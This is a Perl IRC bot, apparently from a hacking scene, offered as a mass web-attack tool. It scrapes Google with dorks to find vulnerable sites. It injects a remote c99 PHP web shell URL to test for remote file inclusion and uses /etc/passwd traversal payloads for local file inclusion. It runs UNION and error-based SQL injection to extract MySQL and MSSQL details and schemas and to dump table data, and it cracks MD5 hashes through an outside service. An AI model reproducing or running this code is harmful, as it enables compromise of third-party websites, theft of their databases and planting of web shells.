#!/usr/bin/perl
#
# OOO  OOO           OO    OO        OO
#  OO   O             O     O         O
#  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO
#  O  O O   O   O     O     O        OOO    OO     OOOOOO       O
#  O   OO   O   O     O     O       O   O   O      O       OOOOOO
# OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO
################################################################################################################################
#                                                AlpHaNiX IRC BOT V1.5 beta
################################################################################################################################
# [+] What's New in this version ?
# 1/ RFI Vulnerable Scanner
# 2/ LFI Vulnerable Scanner
# 3/ an msg when scan finish
# 4/ msg appear once banned from google search
################################################################################################################################
# [+] About   :
################################################################################################################################
# Language : PERL
# Coder    : AlpHaNiX
################################################################################################################################
# [+] Usage   :
################################################################################################################################
#   ------------ You Must Change BOT Config First Of ALL
#   ------------ Bot Commands :
#--   !md5 <word>                                => make an md5 hash
#--   !md5crack <hash>                           => crack md5 hashes 
#--   !base64 <word>                             => encode with base64
#--   !basedecode <text to decode>               => decode base64 text
#--   !lastsploits                               => to get lastest sploits from milw0rm
#-------------------------------------{ SQL INJECTION FUNCTIONS  }-----------------------------------------
#--   !col  <vuln>                               => calculate number of columns in a sql vulnerable
#--   !det <vuln>     *                          => MySQL DB Details (version , user ,db , dir )
#--   !schema <vuln>  *                          => Extract all (DB's , Tables , Columns) names
#--   !dump <vuln>    *                          => Dump Data from a column & table
#--   !ms <vuln>                                 => Get MsSQL DB Details
#  ===>>>  * you must enter vuln this way http://target.com/page.php?id=0+union+select+1,nullarea,2,3
#-------------------------------------{ Vulnerability scan FUNCTIONS  }-----------------------------------------
#--   !sqlscan <dork>                            => fetch url's from google and check if sql vuln or not
#--   !rfiscan <dork>                            => fetch url's from google and check if rfi vuln or not
#--   !lfiscan <dork>                            => fetch url's from google and check if lfi vuln or not
################################################################################################################################
# [+] Contact :                                                                        
################################################################################################################################
# E-Mail Address  : AlpHa[AT]Hacker[DOT]BZ            
# Home Page       : http://NullArea.Net
# My Blog         : #http://NullArea.Net/blog                                                                         
################################################################################################################################
# [+] Greetz :
################################################################################################################################
# Greetz For My Best Friend Zigma !
# Special Thanks For All of : Djekmani4ever / Unary / DexTeR Corleon / r1z                                                                    
################################################################################################################################
# -------------------- Made In Tunisia                                                                 
################################################################################################################################
use IO::Socket::INET ;
use LWP::UserAgent;
use LWP::Simple;
use Digest::MD5 qw(md5_hex);
use MIME::Base64;
############################################################################################
my $server   = "irc.perl.org";     # IRC Server
my $port     = "6667";                 # IRC Server port
my $nick     = "SF[Scan]";                # Bot Nick
my $channel  = "#shellfull";            # Channel to Join
my $name     = "nix user alpha unr";
my $phpshell = "http://www.c99.mobi/c99.txt";  #your phpshell link for RFI scan
############################################################################################
system('cls');
print "\n\n\n\n OOO  OOO           OO    OO        OO\n" ;
print "  OO   O             O     O         O\n" ;
print "  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO\n" ;
print "  O  O O   O   O     O     O        OOO    OO     OOOOOO       O\n" ;
print "  O   OO   O   O     O     O       O   O   O      O       OOOOOO\n" ;
print " OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO\n" ;
print " \n\n                                                    AlpHaNiX IRC BOT V1 \n\n";
print "\n [+] Connection To $server ....\n";
############################################################################################
$connection = IO::Socket::INET->new(PeerAddr=>"$server",
                              PeerPort=>"$port",
                              Proto=>'tcp',
                              Timeout=>'30') or die " [!] Couldnt Connect To $server\n";
print " [+] Connected  To $server ....\n\n";
############################################################################################             
print $connection "USER $name\n";
print $connection "NICK $nick\r\n";
############################################################################################
while($response = <$connection>)
{ 
     print $response;  #print IRC Response
     if($response =~ m/:(.*) 00(.*) (.*) :/){print $connection "JOIN $channel\r\n";}  #-------Join Channel
   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!help/){&help;}                  #-------Print Help  
   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!md5 (.*)$/){&md5encode;}        #------- md5encoder 
     if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!md5crack (.*)$/){&md5cracker;}  #-------md5cracker
   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!base64 (.*)$/){&base64;}        #-------base64 encoder
   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!basedecode (.*)$/){&basedecode;}#-------base64decoder
     if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!iplocation (.*)$/){&iplocation;}#-------ip locator
   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!lastsploits/){&milw0rm;}        #-------last sploits
     if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!sqlscan (.*)$/){&sqlscan;}      #-------SQLi scanner
     if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!lfiscan (.*)$/){&lfiscan;}      #-------LFI Scanner
     if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!rfiscan (.*)$/){&rfiscan;}      #-------RFI Scanner
     if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!col (.*)$/){&colcount;}         #-------column counter
     if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!det (.*)$/){&mysqldet;}         #-------details grabber
   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!schema (.*)$/){&schema;}        #-------schema extractor  
   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!dump (.*)-(.*)-(.*)$/){&mysqldumper}#-------data dumper
     if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!ms (.*)$/){&mssqldet}           #-------mssql details grabber 
   if($response =~ m/^PING (.*?)$/gi){print $connection "PONG ".$1."\r\n";}         #-------ping reponse
}
############################################################################################
sub help
{
   print $connection "PRIVMSG $channel :8,1 AlpHaNiX IRC BOT V1.5 Help : \r\n";
   print $connection "PRIVMSG $channel :8,1                            \r\n";
   print $connection "PRIVMSG $channel :4,1 --------------== Encoding Services ==--------------\r\n";
   print $connection "PRIVMSG $channel :9,1 To Generate an  MD5 Hash => : 11,1  !md5 word          \r\n";
   print $connection "PRIVMSG $channel :9,1 To Crack an MD5 Hash     => : 11,1  !md5crack Hash     \r\n";
   print $connection "PRIVMSG $channel :9,1 To Encode with Base64    => : 11,1  !base64 word       \r\n";
   print $connection "PRIVMSG $channel :9,1 To Decode Base64         => : 11,1  !basedecode base64 \r\n";
   print $connection "PRIVMSG $channel :4,1 ----------------== Other Services ==---------------\r\n";
   print $connection "PRIVMSG $channel :9,1 Check IP Location        => : 11,1  !iplocation ip     \r\n";
   print $connection "PRIVMSG $channel :9,1 Get lastest Sploits      => : 11,1  !lastsploits       \r\n";
   print $connection "PRIVMSG $channel :4,1 ----------------== SQL Injection ==----------------\r\n";  
   print $connection "PRIVMSG $channel :9,1 MySQL Column Count       => : 11,1  !col target        \r\n";   
   print $connection "PRIVMSG $channel :9,1 MySQL DB Details         => : 11,1  !det target        \r\n";   
   print $connection "PRIVMSG $channel :9,1 MySQL Schema Extractor   => : 11,1  !schema target     \r\n";   
   print $connection "PRIVMSG $channel :9,1 MySQL Data Dumper        => : 11,1  !dump target       \r\n";   
   print $connection "PRIVMSG $channel :9,1 MsSQL Details            => : 11,1  !ms target         \r\n";  
   print $connection "PRIVMSG $channel :4,1 ------------== Vulnerablitys Scanner ==------------\r\n"; 
   print $connection "PRIVMSG $channel :9,1 SQL Vuln Scanner         => : 11,1  !sqlscan dork      \r\n";     
   print $connection "PRIVMSG $channel :9,1 LFI Vuln Scanner         => : 11,1  !lfiscan dork      \r\n";     
   print $connection "PRIVMSG $channel :9,1 RFI Vuln Scanner         => : 11,1  !rfiscan dork      \r\n";        
}
############################################################################################
sub md5encode
{
   my $md5_hash = $3;
   my $asker = $1;
   my $md5_generated = md5_hex($md5_hash);
   print $connection "PRIVMSG $channel :4$asker , done =>6 $md5_generated\r\n";
}
############################################################################################
sub md5cracker
{
     my $asker = $1;
   my $hash = $3;
       if (length($hash) != 33)
          {
           print $connection "PRIVMSG $channel :Not Valid MD5 Hash !\r\n";
       }
       else 
         {
               my $ua = LWP::UserAgent->new();
               my $contents = $ua->get('http://md5.rednoize.com/?p&s=md5&q='.$hash);
               my $cracked = $contents->content;
                   if ($cracked)
               {
                    print $connection "PRIVMSG $channel :4$asker Cracked ! =>6 $cracked\r\n";
               }
                   else
                       {
                 print $connection "PRIVMSG $channel :4$asker,6 Not Found !\r\n";
             }
           }
}
############################################################################################
sub base64
{
   my $base64 = $3;
     my $asker = $1;
   my $base64_encoded = encode_base64($base64);
   print $connection "PRIVMSG $channel :4$asker,6 Encoded => $base64_encoded\r\n";
}
############################################################################################
sub basedecode
{
     my $base64d = $3;
   my $asker = $1;
     my $base64_decoded = decode_base64($base64d);
     print $connection "PRIVMSG $channel :4$asker,6 Decoded => $base64_decoded\r\n";
}
############################################################################################
sub iplocation
{
   my $asker = $1;
   my $ip = $3;
       if (length($ip) > 17) 
         {
             print $connection "PRIVMSG $channel :6Not Real IP !\r\n";
       }
       else 
         {
               my $ua = LWP::UserAgent->new();
               my $contents = $ua->get('http://www.melissadata.com/lookups/iplocation.asp?ipaddress='.$ip);
               my $found = $contents->content;
                   if ($found =~ /<tr><td align="right">Country<\/td><td><b>(.*)<\/b><\/td><\/tr>/)
                       {
                   print $connection "PRIVMSG $channel :4$asker , The IP Location =>6 $1\r\n";
               } 
                     else 
                 {
                     print $connection "PRIVMSG $channel :6Not Real IP !\r\n";
               }
           }
}
############################################################################################
sub milw0rm
{
     my $rss = get('http://milw0rm.com/rss.php');
     my $xml = XMLin($rss);
     my $spl = scalar(@{$xml->{channel}->{item}}); 
         for ($i=0; $i<$spl; $i++)
             {
               print $connection "PRIVMSG $channel :4\n";
                 print $connection "PRIVMSG $channel :6Date : $xml->{channel}->{item}->[$i]->{pubDate}\n";
                 print $connection "PRIVMSG $channel :6Title: $xml->{channel}->{item}->[$i]->{title}\n";
                 print $connection "PRIVMSG $channel :6Link : $xml->{channel}->{item}->[$i]->{link}\n\n";
             }
}
############################################################################################
sub sqlscan
{
     my $asker = $1;
   my $dork  = $3;
   print $connection "PRIVMSG $channel :4$asker 12[+] SQL Vulnerable Scan Started ....\r\n";
   print $connection "PRIVMSG $channel :4$asker 12[+] Dork : $dork ....\r\n";
   my $google   = "http://www.google.com/search?hl=en&q=$dork&btnG=Search&start=" ;
    #----
   my $request   = HTTP::Request->new(GET=>"$google"."$i");
     my $useragent = LWP::UserAgent->new(agent => 'Firefox 3.0.9');
     my $response  = $useragent->request($request) ;
     my $con = $response->content;
      if ($con =~ m/restore your access as quickly as possible, so try again soon. In the meantime, if you suspect that your computer or network has been infected/i)
       { print $connection "PRIVMSG $channel :4$asker 12[!] Banned From Google Search !!\r\n"; }
       else 
     {
             for ($i=0;$i<200;$i=$i+10)
                 {
                     my $request   = HTTP::Request->new(GET=>"$google"."$i");
                     my $useragent = LWP::UserAgent->new(agent => 'Mozilla 5.2');
                     my $response  = $useragent->request($request) ;
                     my $con = $response->content;
                     my $start='class=r><a href=\"';
                     my $end= '" class=l>';
                         while ( $con =~ m/$start(.*?)$end/g )
                             { 
                              my $fl     = $1;
                             my $link   = $fl.'0+order+by+9999999--';
                           print $connection "PRIVMSG $channel :4$asker 12[!] Trying To Fuzz6 $1\r\n";
                           my $ua     = LWP::UserAgent->new();
                           my $req    = $ua->get($link);
                           my $result = $req->content;
                               if ($result=~ m/You have an error in your SQL syntax/i || $result=~ m/Query failed/i || $result=~ m/SQL query failed/i || $result=~ m/mysql_fetch_/i || $result=~ m/mysql_fetch_array/i || $result =~ m/mysql_num_rows/i || $result =~ m/The used SELECT statements have a different number of columns/i )
                                 {print $connection "PRIVMSG $channel :4$asker 12[!] Possible MySQL Vulnerable Website ->6 $fl\r\n";}
                             elsif ($result=~ m/ODBC SQL Server Driver/i || $result=~ m/Unclosed quotation mark/i || $result=~ m/Microsoft OLE DB Provider for/i )
                                 {print $connection "PRIVMSG $channel :4$asker 12[!] Possible MsSQL Vulnerable Website ->6 $fl\r\n";}
                             elsif ($result=~ m/Microsoft JET Database/i || $result=~ m/ODBC Microsoft Access Driver/i )
                                 {print $connection "PRIVMSG $channel :4$asker 12[!] Possible MS Access Vulnerable Website ->6 $fl\r\n";}
                             }
                 }
             print $connection "PRIVMSG $channel :4$asker 12[!] SQL Scan Finished !\r\n";         
         }
}
############################################################################################
sub lfiscan
{
     my $asker = $1;
   my $dork  = $3;
   print $connection "PRIVMSG $channel :4$asker 12[+] LFI Vulnerable Scan Started ....\r\n";
   print $connection "PRIVMSG $channel :4$asker 12[+] Dork : $dork ....\r\n";
   my $google   = "http://www.google.com/search?hl=en&q=$dork&btnG=Search&start=" ;
     @LFI = ('../etc/passwd',
     '../../etc/passwd',
     '../../../etc/passwd',
     '../../../../etc/passwd',
     '../../../../../etc/passwd',
     '../../../../../../etc/passwd',
     '../../../../../../../etc/passwd',
     '../../../../../../../../etc/passwd',
     '../../../../../../../../../etc/passwd',
     '../../../../../../../../../../etc/passwd',
     '../../../../../../../../../../../etc/passwd',
     '../../../../../../../../../../../../etc/passwd',
     '../../../../../../../../../../../../../etc/passwd',
     '../../../../../../../../../../../../../../etc/passwd',);
   my $request   = HTTP::Request->new(GET=>"$google"."$i");
     my $useragent = LWP::UserAgent->new(agent => 'Mozilla 5.2');
     my $response  = $useragent->request($request) ;
     my $con = $response->content;
      if ($con =~ m/restore your access as quickly as possible, so try again soon. In the meantime, if you suspect that your computer or network has been infected/i)
       { print $connection "PRIVMSG $channel :4$asker 12[!] Banned From Google Search !!\r\n"; }
       else 
     {
         for ($i=0;$i<200;$i=$i+10)
             {
                 my $start='class=r><a href=\"';
                 my $end= '" class=l>';
                     while ( $con =~ m/$start(.*?)$end/g )
                         { 
                 print $connection "PRIVMSG $channel :4$asker 12[!] Trying To Fuzz6 $1\r\n";
                     for ($j;$j<=14;$j++)
                       {
                                      my $fl     = $1;
                                     my $link   = $fl.$LFI[$j];
                                   my $ua     = LWP::UserAgent->new();
                                   my $req    = $ua->get($link);
                                   my $result = $req->content;
                                       if ($result=~ m/root:x:/i)
                                         {print $connection "PRIVMSG $channel :4$asker 12[!] Possible LFI Vulnerable Website ->6 $fl\r\n";}
                     }
                         }
             }
         print $connection "PRIVMSG $channel :4$asker 12[!] LFI Scan Finished !\r\n";       
         }  
}
############################################################################################
sub rfiscan
{
     my $asker = $1;
   my $dork  = $3;
   print $connection "PRIVMSG $channel :4$asker 12[+] RFI Vulnerable Scan Started ....\r\n";
   print $connection "PRIVMSG $channel :4$asker 12[+] Dork : $dork ....\r\n";
   my $google   = "http://www.google.com/search?hl=en&q=$dork&btnG=Search&start=" ;
   #----
   my $request   = HTTP::Request->new(GET=>"$google"."$i");
     my $useragent = LWP::UserAgent->new(agent => 'Mozilla 5.2');
     my $response  = $useragent->request($request) ;
     my $con = $response->content;
      if ($con =~ m/restore your access as quickly as possible, so try again soon. In the meantime, if you suspect that your computer or network has been infected/i)
       { print $connection "PRIVMSG $channel :4$asker 12[!] Banned From Google Search !!\r\n"; }
       else 
     {
         for ($i=0;$i<200;$i=$i+10)
             {
                 my $start='class=r><a href=\"';
                 my $end= '" class=l>';
                     while ( $con =~ m/$start(.*?)$end/g )
                         { 
                 print $connection "PRIVMSG $channel :4$asker 12[!] Trying To Fuzz6 $1\r\n";
                          my $fl     = $1;
                         my $link   = $fl.$phpshell.'??';
                       my $ua     = LWP::UserAgent->new();
                       my $req    = $ua->get($link);
                       my $result = $req->content;
                           if ($result=~ m/uid=/i)
                             {print $connection "PRIVMSG $channel :4$asker 12[!] Possible RFI Vulnerable Website ->6 $fl\r\n";}
                         }
             }
         print $connection "PRIVMSG $channel :4$asker 12[!] RFI Scan Finished !\r\n";       
         }
}
############################################################################################
sub colcount
{
     my $asker = $1;
     print $connection "PRIVMSG $channel :4$asker 12[+] Column Counting Started , Please Wait ....\r\n";
     my $site = $3 ;
     my $null = "09+and+1=" ;
     my $code = "0+union+select+" ;
     my $add = "+" ;
     my $com = "--" ;
     my $injection = $site.$null.$code."0",$com ;
         my $request   = HTTP::Request->new(GET=>$injection);
         my $useragent = LWP::UserAgent->new();
         my $response  = $useragent->request($request);
         my $result   = $response->content;
             if( $result =~ /You have an error in your SQL syntax/ || $result=~/Query failed/ || $result=~/SQL query failed/ || $result=~ /mysql_fetch_/ || $result=~ /mysql_fetch_array/ || $result =~ /mysql_num_rows/ || $result =~ /The used SELECT statements have a different number of columns/)
                 {
                     print $connection "PRIVMSG $channel :4$asker 12[+] This Website Is Vulnerable\n" ;
                   print $connection "PRIVMSG $channel :4$asker 12[+] Working On It\n";
                 }
             else
                 {
                   print $connection "PRIVMSG $channel :4$asker 10[!] This WebSite Is Not SQL Vulnerable !\n\n";
                 }
                       for ($i = 0 ; $i < 50 ; $i ++)
                             {
                             $col.=','.$i;
                             $specialword.=','."0x617a38387069783030713938";
                                  if ($i == 0)
                                      {
                                         $specialword = '' ;
                                         $col = '' ;
                                      }
                               $sql=$site.$null.$code."0x617a38387069783030713938".$specialword.$com ;
                 my $ua = LWP::UserAgent->new();
                 my $res = $ua->get($sql);
                               $response=$res->content;
                                if($response =~ /az88pix00q98/)
                                      {
                                         $i ++;
                                         print $connection "PRIVMSG $channel :4$asker 12[+] This Injection Have6 $i 12Columns\n" ;
                                    }  
                             } 
}
############################################################################################
sub mysqldet
{
     my $asker     = $1;
     my $site      = $3 ;    
     my $selection = "concat(0x617a38387069783030713938,version(),0x617a38387069783030713938,database(),0x617a38387069783030713938,user(),0x617a38387069783030713938,\@\@datadir,0x617a38387069783030713938)";
     print $connection "PRIVMSG $channel :4$asker 12[+] Info Getting, Started Please Wait ....\r\n";
     if ($site =~ /(.*)NullArea(.*)/i)
             {
                 $newlink = $1.$selection.$2.'--';
                 my $ua = LWP::UserAgent->new();
               my $request = $ua->get($newlink);
               my $content = $request->content;
                     if ($content =~ /az88pix00q98(.*)az88pix00q98(.*)az88pix00q98(.*)az88pix00q98(.*)az88pix00q98/)
                         {
                 print $connection "PRIVMSG $channel :4$asker 12[+] Database Version  :6 $1\r\n";
                             print $connection "PRIVMSG $channel :4$asker 12[+] Database Name     :6 $2\r\n";              
                             print $connection "PRIVMSG $channel :4$asker 12[+] DB UserName       :6 $3\r\n";              
                             print $connection "PRIVMSG $channel :4$asker 12[+] Databse Dir       :6 $4\r\n";              
             }
               else
               {
                 print $connection "PRIVMSG $channel :4$asker 12[!] Failed\r\n";
             }
       }
     else 
         {
           print $connection "PRIVMSG $channel :4$asker 12[!] Please Enter the target this way :6 http://target.net/page.php?id=0+union+select+1,2,nullarea,3\r\n";  
       }
}
############################################################################################
sub schema
{
     my $asker     = $1;
     my $site      = $3 ;
     my $selection = "concat(0x617a38387069783030713938,table_name,0x617a38387069783030713938,column_name,0x617a38387069783030713938,table_schema,0x617a38387069783030713938)";
         if ($site =~ /(.*)NullArea(.*)/i)
           {
         print $connection "PRIVMSG $channel :4$asker 12[+] 6Table 12:|: 6Column 12:|: 6Database\r\n"; 
             for ($i  ;  $i<=1500 ; $i++ )
              {
               $newstring = $1.$selection.$2.'+'.'from'.'+'.'information_schema.columns'.'+'.'LIMIT'.'+'.$i.','.'1'.'--';
                 my $ua = LWP::UserAgent->new();
               my $request = $ua->get($newstring);
               my $content = $request->content;
                     if ($content =~ /az88pix00q98(.*)az88pix00q98(.*)az88pix00q98(.*)az88pix00q98/)
                         { 
                  print $connection "PRIVMSG $channel :4$asker 12[!] 6$1 12:|: 6$2 12:|: 6$3 \r\n";
               }
            }
           }
         else 
           {
                 print $connection "PRIVMSG $channel :4$asker 12[!] Please Enter the target this way :6 http://target.net/page.php?id=0+union+select+1,2,nullarea,3\r\n";  
           }
}
############################################################################################
sub mysqldumper
{
     my $asker     = $1;
     my $site      = $3 ;
   my $table     = $5 ;
   my $selection = "concat(0x617a38387069783030713938,$4,0x617a38387069783030713938)";
         if ($site =~ /(.*)NullArea(.*)/i)
           {
         print $connection "PRIVMSG $channel :4$asker 12[+] 6 DATA\r\n";
             for ($i  ;  $i<=1500 ; $i++ )
              {
               $newstring = $1.$selection.$2.'+'.'from'.'+'.$table.'+'.'LIMIT'.'+'.$i.','.'1'.'--';
                 my $ua = LWP::UserAgent->new();
               my $request = $ua->get($newstring);
               my $content = $request->content;
                 if ($content =~ /az88pix00q98(.*)az88pix00q98/)
                         { 
                  print $connection "PRIVMSG $channel :4$asker 12[!] 6 $1\r\n";
               }
            }
           }
         else 
           {
                 print $connection "PRIVMSG $channel :4$asker 12[!] Please Enter the target this way :6 http://target.net/page.php?id=0+union+select+1,2,nullarea,3-column_name-table_name\r\n";  
           }
}
############################################################################################
sub mssqldet
{
     my $asker = $1;
   print $connection "PRIVMSG $channel :4$asker 12[+] Getting Infos Started , Please Wait ....\r\n";
     my $target = $3 ;
     print "\n[+] Working On $target" ;
     my $version = 'convert(int,(select+@@version));--' ;
     my $system_user = 'convert(int,(select+system_user));--';
     my $db_name = 'convert(int,(select+db_name()));--';
     my $servername = 'convert(int,(select+@@servername));--' ;
     my $hostname = 'convert(int,(select+Host_Name()));--';
     my $site = $target ;
         my $injection = $site.$version ;
         my $request   = HTTP::Request->new(GET=>$injection);
         my $useragent = LWP::UserAgent->new();
         my $response  = $useragent->request($request)->as_string ;
             if ($response =~ /.*?value\s'/)
                {
                   print $connection "PRIVMSG $channel :4$asker 12[+] This Website Is SQL Vulnerable ..\r\n";
                   print $connection "PRIVMSG $channel :4$asker 12[+] Working On It ..\r\n";
  
                     $ver = $1 if ($response =~ /.*?value\s'(.*?)'\sto.*/sm) ;

                        print $connection "PRIVMSG $channel :4$asker 12[!] MsSQL Version Is        : 6$ver\r\n";
  
                           my $injection = $site.$system_user ;
                             my $request   = HTTP::Request->new(GET=>$injection);
                             my $useragent = LWP::UserAgent->new();
                             $useragent->timeout(10);
                             my $response  = $useragent->request($request)->as_string ;
                           $system_user = $1 if ($response =~ /.*value\s'(.*)'\sto.*/);
                             print $connection "PRIVMSG $channel :4$asker 12[!] MsSQL System_User Is    : 6$system_user\r\n";

                                     my $injection = $site.$db_name ;
                                     my $request   = HTTP::Request->new(GET=>$injection);
                                     my $useragent = LWP::UserAgent->new();
                                     $useragent->timeout(10);
                                     my $response  = $useragent->request($request)->as_string ;
                                   $db_name = $1 if ($response =~ /.*value\s'(.*)'\sto.*/);
                                     print $connection "PRIVMSG $channel :4$asker 12[!] MsSQL Database Name Is  : 6$db_name\r\n";    
     
                                           my $injection = $site.$servername ;
                                             my $request   = HTTP::Request->new(GET=>$injection);
                                             my $useragent = LWP::UserAgent->new();
                                             $useragent->timeout(10);
                                             my $response  = $useragent->request($request)->as_string ;
                                           $servername = $1 if ($response =~ /.*value\s'(.*)'\sto.*/);
                                             print $connection "PRIVMSG $channel :4$asker 12[!] MsSQL Server Name Is    : 6$servername\r\n";
             
                                                      my $injection = $site.$hostname;
                                     my $request   = HTTP::Request->new(GET=>$injection);
                                                     my $useragent = LWP::UserAgent->new();
                                                     $useragent->timeout(10);
                                                     my $response  = $useragent->request($request)->as_string ;
                                                   $hostnames = $1 if ($response =~ /.*value\s'(.*)'\sto.*/);
                                                     print $connection "PRIVMSG $channel :4$asker 12[!] MsSQL HostName Is       : 6$hostnames\r\n";
                }
           else 
                {
                   print $connection "PRIVMSG $channel :4$asker 10[!] This Website Is Not SQL Vulnerable !\r\n";
                }
}
############################################################################################
